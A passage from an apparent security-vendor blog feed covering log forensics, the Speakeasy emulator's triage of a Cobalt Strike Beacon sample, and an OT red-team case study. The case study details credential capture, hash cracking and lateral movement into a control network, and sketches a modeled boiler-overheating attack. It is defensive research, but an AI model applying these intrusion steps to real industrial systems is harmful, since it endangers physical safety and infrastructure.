  improve</li> <li>Enhance logs from “whatever the developers
    implemented” to “designed to be investigated”</li> <li>Develop
    investigative workflows that are reliable and repeatable</li>
    <li>Correlate pivot points between your data sources and streamline
    correlation capabilities</li> <li>Create monitoring and alerting
    capabilities based on threat modeling</li> <li>Lower the technical
    barrier for comprehensive analysis</li> <li>Implement similar
    analysis capabilities to those in the “DFUR” Splunk application,
    linked in the References section</li> <li>Understand that logs can
    lead into better security analytics and strengthening of your
    security operations</li> </ul>
 <h4>References</h4>
 <p>For organizations that utilize Splunk security solutions as their
  SIEM solution, for automation, analytics or log aggregation, or want
  to try out for free with Splunk’s free trial download, we developed an
  application called “Dog and Feline Urgent Response (DFUR)” to
  demonstrate application log forensic analysis and dashboard pivoting
  concepts. The code contains pre-indexed data and CSV files referenced
  by searches contained in four Splunk XML dashboards. All data, such as
  IP addresses and usernames, was fabricated for the purposes of the
  demo and any association with organizations, users, or pets is coincidental.</p>
 <ul> <li>Watch the recording of our <a
      href="https://www.youtube.com/watch?v=_soMAPXJs5c">SANS DFIR
      Summit presentation</a>.</li> <li>Download the <a
      href="https://github.com/fireeye/DFUR-Splunk-App">&quot;DFUR&quot;
      Splunk application in FireEye GitHub</a>.</li> <li>If you need
    assistance investigating application attacks or developing log
    analysis capabilities, contact us at
  investigations@mandiant.com.</li> </ul>
http://www.fireeye.com/blog/threat-research/2020/09/dfur-ent-perspective-on-threat-modeling-and-application-log-forensic-analysis.html2020-09-14T16:30:00.000Z2020-09-14T16:37:33.450ZEmulation of Malicious Shellcode With Speakeasynoemail@noemail.orgAndrew Davis<p>In order to enable emulation of malware samples at scale, we have
  developed the <a href="https://github.com/fireeye/speakeasy">Speakeasy
    emulation framework</a>. Speakeasy aims to make it as easy as
  possible for users who are not malware analysts to acquire triage
  reports in an automated way, as well as enabling reverse engineers to
  write custom plugins to triage difficult malware families.</p>
 <p>Originally created to emulate Windows kernel mode malware, Speakeasy
  now also supports user mode samples. The project’s main goal is high
  resolution emulation of the Windows operating system for dynamic
  malware analysis for the x86 and amd64 platforms. Similar emulation
  frameworks exist to emulate user mode binaries. Speakeasy attempts to
  differentiate from other emulation frameworks the following ways:</p>
 <ul> <li>Architected specifically around emulation of Windows
  malware</li> <li>Supports emulation of kernel mode binaries to analyze
    difficult to triage rootkits</li> <li>Emulation and API support
    driven by current malware trends to provide the community with a
    means to extract indicators of compromise with no extra tooling</li>
    <li>Completely configurable emulation environment requiring no
    additional code</li> </ul>
 <p>The project currently supports kernel mode drivers, user mode
  Windows DLLs and executables, as well as shellcode. Malware samples
  can be automatically emulated, with reports generated for later post
  processing. The ongoing project goal will be continuing to add support
  for new or popular malware families.</p>
 <p>In this blog post, we will show an example of Speakeasy’s
  effectiveness at automatically extracting network indicators from a
  Cobalt Strike Beacon sample acquired from an online malware aggregate.</p>
 <h4>Background</h4>
 <p>Dynamic analysis of Windows malware has always been a crucial step
  during the malware analysis process. Understanding how malware
  interacts with the Windows API and extracting valuable host-based and
  network-based indicators of compromise (IOCs) are critical to
  assessing the impact malware has on an affected network. Typically,
  dynamic analysis is performed in an automated or targeted fashion.
  Malware can be queued to execute within a sandbox to monitor its
  functionality, or manually debugged to reveal code paths not executed
  during sandbox runs.</p>
 <p>Code emulation has been used historically for testing, validation
  and even malware analysis. Being able to emulate malicious code lends
  many benefits from both manual and automated analysis. Emulation of
  CPU instructions allows for total instrumentation of binary code where
  control flow can be influenced for maximum code coverage. While
  emulating, all functionality can be monitored and logged in order to
  quickly extract indicators of compromise or other useful intelligence.</p>
 <p>Emulation provides several advantages over execution within a
  hypervisor sandbox. A key advantage is noise reduction. While
  emulating, the only activity that can be recorded is either written by
  the malware author, or statically compiled within the binary. API
  hooking within a hypervisor (especially from a kernel mode
  perspective) can be difficult to attribute to the malware itself. For
  example, sandbox solutions will often hook heap allocator API calls
  without knowing if the malware author intended to allocate memory, or
  if a lower-level API was responsible for the memory allocation.</p>
 <p>However, emulation has disadvantages as well. Since we are removing
  the operating system from the analysis phase, we, as the emulator, are
  now responsible for providing the expected inputs and outputs from API
  calls and memory access that occur during emulation. This requires
  substantial effort in order to successfully emulate malware samples
  that are expected to the run on a legitimate Windows system.</p>
 <h4>Shellcode as an Attack Platform</h4>
 <p>In general, shellcode is an excellent choice for attackers to remain
  stealthy on an infected system. Shellcode runs within executable
  memory and does not need to be backed by any file on disk. This allows
  attacker code to hide easily within memory where most forms of
  traditional forensic analysis will fail to identify it. Either the
  original binary file that loads the shellcode must first be
  identified, or the shellcode itself must be dumped from memory. To
  avoid detection, shellcode can be hidden within a benign appearing
  loader, and then be injected into another user mode process.</p>
 <p>In the first part of this blog series, we will show the
  effectiveness of emulation with one of the more common samples of
  shellcode malware encountered during incident response investigations.
  Cobalt Strike is a commercial penetration testing framework that
  typically utilizes stagers to execute additional code. An example of a
  stager is one that downloads additional code via a HTTP request and
  executes the HTTP response data. The data in this case is shellcode
  that commonly begins with a decode loop, followed by a valid PE that
  contains code to reflectively load itself. In the case of Cobalt
  Strike, this means it can be executed from the start of the executable
  headers and will load itself into memory. Within the Cobalt Strike
  framework, the payload in this case is typically an implant known as
  Beacon. Beacon is designed to be a memory resident backdoor used to
  maintain command and control (C2) over an infected Windows system. It
  is built using the Cobalt Strike framework without any code
  modifications and can be easily built to have its core functionality
  and its command and control information modified.</p>
 <p>All of this allows attackers to rapidly build and deploy new
  variants of Beacon implants on compromised networks. Therefore, a tool
  to rapidly extract the variable components of Beacon are necessary
  and, ideally, will not require the valuable time of malware analysts.</p>
 <h4>Speakeasy Design</h4>
 <p>Speakeasy currently employs the QEMU-based emulator engine Unicorn
  to emulate CPU instructions for the x86 and amd64 architectures.
  Speakeasy is designed to support arbitrary emulation engines in the
  future via an abstraction layer, but it currently relies on Unicorn.</p>
 <p>Full OS sandboxing will likely always be required to analyze all
  samples as generically emulating all of Windows is somewhat
  unfeasible. Sandboxing can be difficult to scale on demand and can be
  time consuming to run samples. However, by making sure we emulate
  specific malware families, such as Beacon in this example, we can
  quickly reduce the need to reverse engineer variants. Being able to
  generate high level triage reports in an automated fashion is often
  all the analysis that is needed on a malware variant. This allows
  malware analysts more time to focus on samples that may require deeper analysis.</p>
 <p>Shellcode or Windows PEs are loaded into the emulated address space.
  Windows data structures required to facilitate basic emulation of
  Windows kernel mode and user mode are created before attempting to
  emulate the malware. Processes, drivers, devices and user mode
  libraries are “faked” in order to present the malware with a realistic
  looking execution environment. Malware will be able to interact with
  an emulated file system, network and registry. All these emulated
  subsystems can be configured with a configuration file supplied to
  each emulation run.</p>
 <p>Windows APIs are handled by Python API handlers. These handlers will
  try to emulate expected outputs from these APIs so that malware
  samples will continue their expected execution path. When defining an
  API handler, all that is needed is the name of the API, the number of
  arguments the API expects, and an optional calling convention
  specification. If no calling convention is supplied, stdcall is
  assumed. Currently, if an API call is attempted that is not supported,
  Speakeasy will log the unsupported API and move on to the next entry
  point. An example handler for the Windows HeapAlloc function exported
  by kernel32.dll is shown in Figure 1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Example handler for Windows
    HeapAlloc function</span></p>
 <p>All entry points are emulated by default. For example, for DLLs, all
  exports are emulated, and for drivers, the IRP major functions are
  each emulated. In addition, dynamic entry points that are discovered
  during runtime are followed. Some examples of dynamic entry points
  include threads that are created or callbacks that are registered.
  Attributing activity to specific entry points can be crucial to seeing
  the whole picture when trying to identify the impact of a malware infection.</p>
 <h4>Reporting</h4>
 <p>Currently, all events captured by the emulator are logged and
  represented by a JSON report for easy post processing. This report
  contains events of interest that are logged during emulation. Like
  most emulators, all Windows API calls are logged along with arguments.
  All entry points are emulated and tagged with their corresponding API
  listings. In addition to API tracing, other specific events are called
  out including file, registry and network access. All decoded or
  “memory resident” strings are dumped and displayed in the report to
  revealed useful information not found within static string analysis.
  Figure 2 shows an example of a file read event logged in a Speakeasy
  JSON report.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: File read event in a Speakeasy report</span></p>
 <h4>Speed</h4>
 <p>Because the framework is written in Python, speed is an obvious
  concern. Unicorn and QEMU are written in C, which provides very fast
  emulation speeds; however, the API and event handlers we write are in
  Python. Transitioning between native code and Python is extremely
  expensive and should be done as little as possible. Therefore, the
  goal is to only execute Python code when it is absolutely necessary.
  By default, the only events we handle in Python are memory access
  exceptions or Windows API calls. In order to catch Windows API calls
  and emulate them in Python, import tables are doped with invalid
  memory addresses so that we only switch into Python when import tables
  are accessed. Similar techniques are used for when shellcode accesses
  the export tables of DLLs loaded within the emulated address space of
  the malware. By executing as little Python code as possible, we can
  maintain reasonable speeds while still allowing users to rapidly
  develop capabilities for the framework.</p>
 <h4>Memory Management</h4>
 <p>Speakeasy implements a lightweight memory manager on top of the
  emulator engine’s memory management. Each chunk of memory allocated by
  malware is tracked and tagged so that meaningful memory dumps can be
  acquired. Being able to attribute activity to specific chunks of
  memory can prove to be extremely useful for analysts. Logging memory
  reads and writes to sensitive data structures can reveal the true
  intent of malware not revealed by API call logging, which is
  particularly useful for samples such as rootkits.</p>
 <p>Speakeasy offers an optional “memory tracing” feature that will log
  all memory accesses that samples exhibit. This will log all reads,
  writes and executes to memory. Since the emulator tags all allocated
  memory chunks, it is possible to glean much more context from this
  data. If malware hooks a critical data structure or pivots execution
  to dynamically mapped memory this will be revealed and can be useful
  for debugging or attribution. This feature comes at a great speed
  cost, however, and is not enabled by default.</p>
 <p>The emulated environment presented to malware includes common data
  structures that shellcode uses to locate and execute exported Windows
  system functions. It is necessary to resolve exported functions in
  order to invoke the Win32 API and therefore have meaningful impact on
  a targeted system. In most cases, Beacon included, these functions are
  located by walking the process environment block (commonly called the
  PEB). From the PEB, shellcode can access a list of all loaded modules
  within a process’s virtual address space.</p>
 <p>Figure 3 shows a memory report generated from emulating a Beacon
  shellcode sample. Here we can trace the malware walking the PEB in
  order to find the address of kernel32.dll. The malware then manually
  resolves and calls the function pointer for the “VirtualAlloc” API,
  and proceeds to decode and copy itself into the new buffer to pivot execution.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Memory trace report</span></p>
 <h4>Configuration</h4>
 <p>Speakeasy is highly configurable and allows users to create their
  own “execution profiles”. Different levels of analysis can be
  specified in order to optimize individual use cases. The end goal is
  allowing users easy switching of configuration options with no code
  changes. Configuration profiles are currently structured as JSON
  files. If no profile is provided by the user, a default configuration
  is provided by the framework. The individual fields are documented
  within the Speakeasy project.</p>
 <p>Figure 4 shows a snippet of the network emulator configuration
  subsection. Here, users can specify what IP addresses get returned
  when a DNS lookup occurs, or in the case of some Beacon samples, what
  binary data gets returned during a TXT record query. HTTP responses
  have custom responses configured as well.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Network configuration</span></p>
 <p>Many HTTP stagers will retrieve a web resource using a HTTP GET
  request. Often, such as with Cobalt Strike or Metasploit stagers, this
  buffer is then immediately executed so the next stage of execution can
  begin. This response can be easily configured with Speakeasy
  configurations. In the configuration in Figure 4, unless overridden,
  the framework will supply the data contained in the referenced
  default.bin file. This file currently contains debug interrupt
  instructions (int3), so if the malware attempts to execute the data it
  exits and will be logged in the report. Using this, we can easily
  label the malware as a downloader that downloads additional code.
  Configuration fields also exist for file system and registry
  emulation. Files and registry paths can similarly be configured to
  return data to samples that expect to be running on a live Windows system.</p>
 <h4>Limitations</h4>
 <p>As said, emulation comes with some challenges. Maintaining feature
  parity with the system being emulated is an ongoing battle; however,
  it provides unique opportunities for controlling the malware and
  greater introspection options.</p>
 <p>In cases where emulation does not complete fully, emulation reports
  and memory dumps can still be generated in order to gather as much
  data as possible. For example, a backdoor may successfully install its
  persistence mechanism, but fail to connect to its C2 server. In this
  situation, the valuable host-based indicators are still logged and can
  provide value to an analyst.</p>
 <p>Missing API handlers can quickly and easily be added to the emulator
  in order to handle these situations. For many API handlers, simply
  returning a success code will be sufficient to make the malware to
  continue execution. While full emulation of every piece of malware may
  not be feasible, targeting functionality of specific malware families
  can greatly reduce the need to reverse engineer variants of the same families.</p>
 <h4>Usage</h4>
 <p>Speakeasy is <a
    href="https://github.com/fireeye/speakeasy">available right now on
    our GitHub</a>. It can be installed with the included Python
  installer script or installed within a Docker container using the
  provided Dockerfile. It is platform agnostic and can be used to
  emulate Windows malware on Windows, Linux or MacOS. More information
  can be found on the project’s <a href="https://github.com/fireeye/speakeasy#readme">README</a>.</p>
 <p>Once installed, Speakeasy can be used as a standalone library or
  invoked directly using the provided run_speakeasy.py script. In this
  blog post we will demonstrate how to emulate a malware sample directly
  from the command line. For information on how to use Speakeasy as a
  library, see the project’s <a href="https://github.com/fireeye/speakeasy#readme">README</a>.</p>
 <p>The included script is meant to emulate a single sample and generate
  a JSON report with the logged events. The command line arguments for
  run_speakeasy.py are shown in Figure 5.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Command line arguments for run_speakeasy.py</span></p>
 <p>Speakeasy also offers a rich development and hooking interface for
  writing custom plugins. This will be covered in more detail in a later
  blog post.</p>
 <h4>Emulation of a Beacon Implant</h4>
 <p>For this example, we will be emulating shellcode that decodes and
  executes a Beacon implant variant that has a SHA-256 hash of
  7f6ce8a8c2093eaf6fea1b6f1ef68a957c1a06166d20023ee5b637b5f7838918. We
  begin by verifying the file format of the sample. This sample is
  expected to be launched either by a loader or used as part of an
  exploit payload.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Hex dump of malware sample</span></p>
 <p>In Figure 6, we can clearly see that the file is not in the PE file
  format. An analyst who has seen many shellcode samples may notice the
  first two bytes: “0xfc 0xe8”. These bytes disassemble to the intel
  assembly instructions “cld” and “call”. The “cld” instruction is a
  common prelude to position independent shellcode as it will clear the
  direction flag allowing malware to easily parse string data from
  system DLL’s export tables. The following call instruction is often
  used by shellcode to get its current program counter by following it
  with a “pop” instruction. This allows the malware to discover where it
  is executing from in memory.</p>
 <p>Since we are reasonably certain this sample is shellcode, we will
  invoke Speakeasy with the command line shown in Figure 7.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Command line used to emulate
    malware sample</span></p>
 <p>This will instruct Speakeasy to emulate the sample from offset zero
  as x86 shellcode. Note: even though we are emulating code and not
  actually executing it, these are still attacker generated binaries. It
  may still be wise to emulate malicious code within a virtual machine
  in the event a vulnerability is discovered in whatever native CPU
  emulation engine is used.</p>
 <p>After emulation, a report will be generated named “report.json”. In
  addition, a full memory dump of the emulation environment will be
  compressed and written to “memory_dump.zip”. The malware will get
  loaded into emulated memory inside of a fake container process to
  simulate a real execution environment that shellcode would expect to
  be running in. Once emulation begins, emulated API calls will be
  logged to the screen along with their arguments and return values.
  Figure 8 shows the Beacon sample allocating a new memory buffer where
  it will copy itself. The malware then begins to manually resolve
  exports it needs to execute.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Network configuration</span></p>
 <p>After additional decoding and setup, the malware attempts to connect
  to its C2 server. In Figure 9, we can see the malware using the
  Wininet library to connect and read data from the C2 server using HTTP.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Wininet API calls to connect to C2</span></p>
 <p>The malware will loop endlessly until it receives the data it
  expects from its C2 server. Speakeasy will timeout after a
  predetermined amount of time and generate a JSON report.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Network C2 events</span></p>
 <p>The network indicators are summarized in the “network_events” and
  “traffic” sections of the generated report. In Figure 10, we can see
  the IP address, port number and, in this case, HTTP headers associated
  with the connections made by the malware.</p>
 <p>In this example, when we emulated the sample, we instructed
  Speakeasy to create a memory dump of the emulated address space. A ZIP
  archive will get created of each memory allocation along with context
  around it. This context includes base address, size and a tag that is
  assigned by the emulator in order to identify what the memory
  allocation corresponds to. Figure 11 shows a snippet of the memory
  dump files created during emulation. The file names contain the tag
  and base address associated with each memory allocation.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: Individual memory blocks
    acquired from emulation</span></p>
 <p>If we just run strings on these memory dumps, we can quickly locate
  interesting strings along with the Beacon configuration data, which is
  shown in Figure 12.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: Configuration string data for
    the malware</span></p>
 <p>In a triage level of analysis, we may only care about the indicators
  of compromise for a malware variant of a known family. However, if
  full reverse engineering of the sample is required, we can also
  recover the decoded version of the Beacon malware in its DLL form. By
  simply doing a primitive grep for the “MZ” magic bytes, we find the
  only hits are the memory dumps related to the original sample’s
  allocation and the virtual allocated buffer that the malware copies
  itself to (Figure 13).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Memory dump containing the
    decoded malware</span></p>
 <p>If we look at the bytes in the original shellcode buffer, we can see
  that it was decoded before it was copied and is sitting in memory
  ready to be dumped at offset 0x48. We can now successfully load the
  decoded Beacon DLL into IDA Pro for full analysis (Figure 14).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy/picture14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: Decoded malware successfully
    loaded into IDA Pro</span></p>
 <h4>Conclusion</h4>
 <p>In this blog post we demonstrated how the Speakeasy emulation
  framework can be used to automatically triage a Beacon malware sample.
  We used it to discover valuable network indicators, extract its config
  information from memory, and acquire a decoded Beacon DLL for further analysis.</p>
 <p>Head over to our GitHub to <a
    href="https://github.com/fireeye/speakeasy">start using Speakeasy
  today</a>, and stay tuned for the next blog post where we will
  demonstrate kernel malware analysis using emulation.</p>
http://www.fireeye.com/blog/threat-research/2020/08/emulation-of-malicious-shellcode-with-speakeasy.html2020-08-26T15:00:00.000Z2020-08-26T14:58:49.721ZA Hands-On Introduction to Mandiant's Approach to OT Red Teamingnoemail@noemail.orgMark Heekin<p>Operational technology (OT) asset owners have historically considered
  red teaming of OT and industrial control system (ICS) networks to be
  too risky due to the potential for disruptions or adverse impact to
  production systems. While this mindset has remained largely unchanged
  for years, Mandiant's experience in the field suggests that these
  perspectives are changing; we are increasingly delivering value to
  customers by safely red teaming their OT production networks.</p>
 <p>This increasing willingness to red team OT is likely driven by a
  couple of factors, including the growing number and visibility of
  threats to OT systems, the increasing adoption of IT hardware and
  software into OT networks, and the maturing of OT security teams. In
  this context, we deemed it relevant to share some details on
  Mandiant's approach to red teaming in OT based on years of experience
  supporting customers learning about tangible threats in their
  production environments.</p>
 <p>In this post we introduce Mandiant's approach to OT red teaming and
  walk through a case study. During that engagement, it took Mandiant
  only six hours to gain administrative control on the target's OLE for
  Process Control (OPC) servers and clients in the target's Distributed
  Control System (DCS) environment. We then used this access to collect
  information and develop an attack scenario simulating the path a
  threat actor could take to prepare for and attack the physical process
  (We highlight that the red team did not rely on weaknesses of the DCS,
  but instead weak password implementations in the target environment).</p>
 <p>
  <i>NOTE:</i> <i>Red teaming in OT production systems requires
    planning, preparation and &quot;across the aisle&quot;
    collaboration. The red team must have deep knowledge of industrial
    process control and the equipment, software, and systems used to
    achieve it. The red team and the asset owner must establish
    acceptable thresholds before performing any activities.</i></p>
 <p>Visit our website for <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">more
  information</a> or to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
    services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
 <h4>Mandiant's Approach for Safe Red Teaming in OT</h4>
 <p>Mandiant's approach to red teaming OT production systems consists of
  two phases: active testing on IT and/or OT intermediary systems, and
  custom attack modeling to develop one or more realistic attack
  scenarios. Our approach is designed to mirror the OT-targeted attack
  lifecycle—with active testing during initial stages (Initial
  Compromise, Establish Foothold, Escalate Privileges, and Internal
  Reconnaissance), and a combination of active/passive data collection
  and custom threat modeling to design feasible paths an attacker would
  follow to complete the mission.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-red-team/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Mandiant OT red teaming approach</span></p>
 <ul> <li>Mandiant's OT red teaming may begin either from the
    perspective of an external attacker leveraging IT compromises to
    pivot into the OT network, or from the perspective of an actor who
    has already gained access into the OT network and is ready to
    escalate the intrusion.</li> <li>We then leverage a range of
    commodity tools and utilities that are widely available in most
    target environments to pivot across OT intermediary systems and gain
    privileged access to target ICS.</li> <li>Throughout this process,
    we maintain constant communication with the customer to establish
    safety thresholds. Active participation from the defenders will also
    enable the organization to learn about the techniques we use to
    extract information and the weaknesses we exploit to move across the
    target network.</li> <li>Once the active testing stops at the agreed
    safety threshold, we compile this information and perform additional
    research on the system and processes to develop realistic and
    target-specific attack scenarios based on our expertise of threat
    actor behaviors.</li> </ul>
 <p>Mandiant's OT red teaming can be scoped in different ways depending
  on the target environment, the organization's goals, and the asset
  owner's cyber security program maturity. For example, some
  organizations may test the full network architecture, while others
  prefer to sample only an attack on a single system or process. This
  type of sampling is useful for organizations that own a large number
  of processes and are unlikely to test them one by one, but instead
  they can learn from a single-use case that reflects target-specific
  weaknesses and vulnerabilities. Depending on the scope, the red
  teaming results can be tailored to:</p>
 <ul> <li>Model attack scenarios based on target-specific
    vulnerabilities and determine the scope and consequences if a threat
    actor were to exploit them in their environment.</li> <li>Model
    attack paths across the early stages of reconnaissance and lateral
    movement to identify low-hanging fruit that adversaries may exploit
    to enable further compromise of OT.</li> <li>Operationalize threat
    intelligence to model scenarios based on tactics, techniques, and
    procedures (TTPs) from known actors, such as <a
      href="/content/fireeye-www/en_US/current-threats/apt-groups.html">advanced
      persistent threats</a> (APTs).</li> <li>Test specific processes or
    systems deemed at high risk of causing a disruption to safety or
    operations. This analysis highlights gaps or weaknesses to determine
    methods needed to secure high-risk system(s).</li> </ul>
 <h4>Red Teaming in OT Provides Unique Value to Defenders</h4>
 <p>Red teaming in OT can be uniquely helpful for defenders, as it
  generates value in a way very specific to an organizations' needs,
  while decreasing the gap between the &quot;no holds barred&quot; world
  of real attackers and the &quot;safety first&quot; responsibility of
  the red team. While it is common for traditional red teaming
  engagements to end shortly after the attacker pivots into a production
  OT segment, a hybrid approach, such as the one we use, makes it
  possible for defenders to gain visibility into the specific strengths
  and weaknesses of their OT networks and security implementations. Here
  are some other benefits of red teaming in OT production networks:</p>
 <ul> <li>It helps defenders understand and foresee possible paths that
    sophisticated actors may follow to reach specific goals. While cyber
    threat intelligence is another great way to build this knowledge,
    red teaming allows for additional acquisition of site-specific
  data.</li> <li>It responds to the needs of defenders to account for
    varying technologies and architectures present in OT networks across
    different industries and processes. As a result, it accounts for
    outliers that are often not covered by general security best
    practices guidance.</li> <li>It results in tangible and realistic
    outputs based on our active testing showing what can really happen
    in the target network. Mandiant's OT red teaming results often show
    that common security testing tools are sufficient for actors to
    reach critical process networks.</li> <li>It results in conceptual
    attack scenarios based on real attacker behaviors and specific
    knowledge about the target. While the scenarios may sometimes
    highlight weaknesses or vulnerabilities that cannot be patched,
    these provide defenders with the knowledge needed to define
    alternative mitigations to mitigate risks earlier in the
  lifecycle.</li> <li>It can help to identify real weaknesses that could
    be exploited by an actor at different stages of the attack
    lifecycle. With this knowledge, defenders can define ways to stop
    threat activity before it reaches critical production systems, or at
    least during early phases of the intrusion.</li> </ul>
 <h4>Applying Our Approach in the Real World: Big Steam Works</h4>
 <p>During this engagement, we were tasked with gaining access to
  critical control systems and designing a destructive attack in an
  environment where industrial steaming boilers are operated with an
  Distributed Control System (DCS). In this description, we redacted
  customer information—including the name, which we refer to as
  &quot;Big Steam Works&quot;—and altered sensitive details. However,
  the overall attack techniques remain unchanged. The main objective of
  Big Steam Works is to deliver steam to a nearby chemical production company.</p>
 <p>For the scope of this red team, the customer wanted to focus
  entirely on its OT production network. We did not perform any tests in
  IT networks and instead begun the engagement with initial access
  granted in the form of a static IP address in Big Steam Work's OT
  network. The goal of the engagement was to deliver consequence-driven
  analysis exploring a scenario that could cause a significant physical
  impact to both safety and operations. Following our red teaming
  approach, the engagement was divided in two phases: active testing
  across IT and/or OT intermediary systems, and custom attack modeling
  to foresee paths an attacker may follow to complete its mission.</p>
 <p>We note that during the active testing phase we were very careful to
  maintain high safety standards. This required not only highly skilled
  personnel with knowledge about both IT and OT, but also constant
  engagement with the customer. Members from Big Steam Works helped us
  to set safety thresholds to stop and evaluate results before moving
  forward, and actively monitored the test to observe, learn, and remain
  vigilant for any unintended changes in the process.</p>
 <p>
  <i>Phase 1 – Active Testing</i></p>
 <p>During this phase, we leveraged publicly accessible offensive
  security tools (including Wireshark, Responder, Hashcat, and
  CrackMapExec) to collect information, escalate privileges, and move
  across the OT network. In close to six hours, we achieved
  administrative control on several Big Steam Works' OLE for Process
  Control (OPC) servers and clients in their DCS environment. We
  highlight that the test did not rely on weaknesses of the DCS, but
  instead weak password implementations in the target environment.
  Figure 2 details our attack path:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-red-team/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Active testing in Big Steam
    Work's OT network</span></p>
 <ol> <li>We collected network traffic using Wireshark to map network
    communications and identify protocols we could use for credential
    harvesting, lateral movement, and privilege escalation. Passive
    analysis of the capture showed Dynamic Host Configuration Protocol
    (DHCP) broadcasts for IPv6 addresses, Link-Local Multicast Name
    Resolution (LLMNR) protocol traffic, and NetBios Name Service
    (NBT-NS) traffic.</li> <li>We responded to broadcast LLMNR, NBT-NS,
    and WPAD name resolution requests from devices using a publicly
    available tool called Responder. As we supplied our IP address in
    response to broadcasted name resolution requests from other clients
    on the subnet, we performed man-in-the-middle (MiTM) attacks and
    obtained NTLMv1/2 authentication protocol password hashes from
    devices on the network.</li> <li>We then used Hashcat to crack the
    hashed credentials and use them for further lateral movement and
    compromise. The credentials we obtained included, but were not
    limited to, service accounts with local administrator rights on OPC
    servers and clients. We note that Hashcat cracked the captured
    credentials in only six seconds due to the lack of password strength
    and complexity.</li> <li>With the credentials captured in the first
    three steps, we accessed other hosts on the network using
    CrackMapExec. We dumped additional cached usernames, passwords, and
    password hashes belonging to both local and domain accounts from
    these hosts.</li> <li>This resulted in privileged access and control
    over the DCS's OPC clients and servers in the network. While we did
    not continue to execute any further attack, the level of access
    gained at this point enabled us to perform further reconnaissance
    and data collection to design and conceptualize the last steps of a
    targeted attack on the industrial steaming boilers.</li> </ol>
 <p>The TTPs we used during the active testing phase resemble some of
  the simplest resources that can be used by threat actors during real
  OT intrusions. The case results are concerning given that they
  illustrate only a few of the most common weaknesses we often observe
  across Mandiant OT red team engagements. We highlight that all the
  tools used for this intrusion are known and publicly available. An
  attacker with access to Big Steam Works could have used these methods
  as they represent low-hanging fruit and can often be prevented with
  simple security mitigations.</p>
 <p>
  <i>Phase 2 – Custom Attack Modeling</i></p>
 <p>For roughly a week, Mandiant gathered additional information from
  client documentation and research on industrial steaming boilers. We
  then mirrored the process an attacker would follow to design a
  destructive attack on the target process given the results achieved
  during phase 1. At this point of the intrusion, the attacker would
  have already obtained complete control over Big Steam Works' OPC
  clients and servers, gaining visibility and access to the DCS environment.</p>
 <p>Before defining the path to follow, the attacker would likely have
  to perform further reconnaissance (e.g., compromising additional
  systems, data, and credentials within the Big Steam Works DCS
  environment). Specifically, the attacker could:</p>
 <ul> <li>Gain access to the DCS configuration software/engineering
  workstation</li> <li>Obtain configuration/control logic files</li>
    <li>Determine the type/function of the different DCS nodes in the
  environment</li> <li>Use native DCS tools for system overview,
    graphics display, and point drill down</li> <li>Identify
    alarms/alerts monitored by operators via remote HMI screens and map
    them to defined points</li> <li>Map the flow of the physical process
    based on data collection and review</li> </ul>
 <p>Our next step was to develop the custom scenario. For this example,
  we were tasked with modeling a case where the attacker was attempting
  to create a condition that had a high likelihood of causing physical
  damage and disruption of operations (see Figure 3). In this scenario,
  the attacker attempted to achieve this by lowering the water level in
  a boiler drum below the safe threshold while not tripping the burner
  management system or other safety mechanisms. If successful, this
  would result in rapid and extreme overheating in the boiler. Opening
  the feedwater valve under such conditions could result in a
  catastrophic explosion.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/ot-red-team/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Custom attack model diagram for
    Big Steam Works</span></p>
 <p>Figure 3 describes how a real attacker might pursue their mission
  after gaining access to the OPC servers and clients. As the actor
  moves closer to their goals, it becomes more difficult to assess both
  the probability of success and the actual impact of their actions due
  to nuances specific to the client environment and additional safety
  and security controls built into the process. However, the analysis
  holds significant value as it illustrates the overall structure of the
  physical process and potential attacker behaviors aimed at achieving
  specific end goals. Furthermore, it proceeds directly from the results
  obtained during the first phase of the red teaming.</p>
 <p>The model presents one feasible combination of actions that an
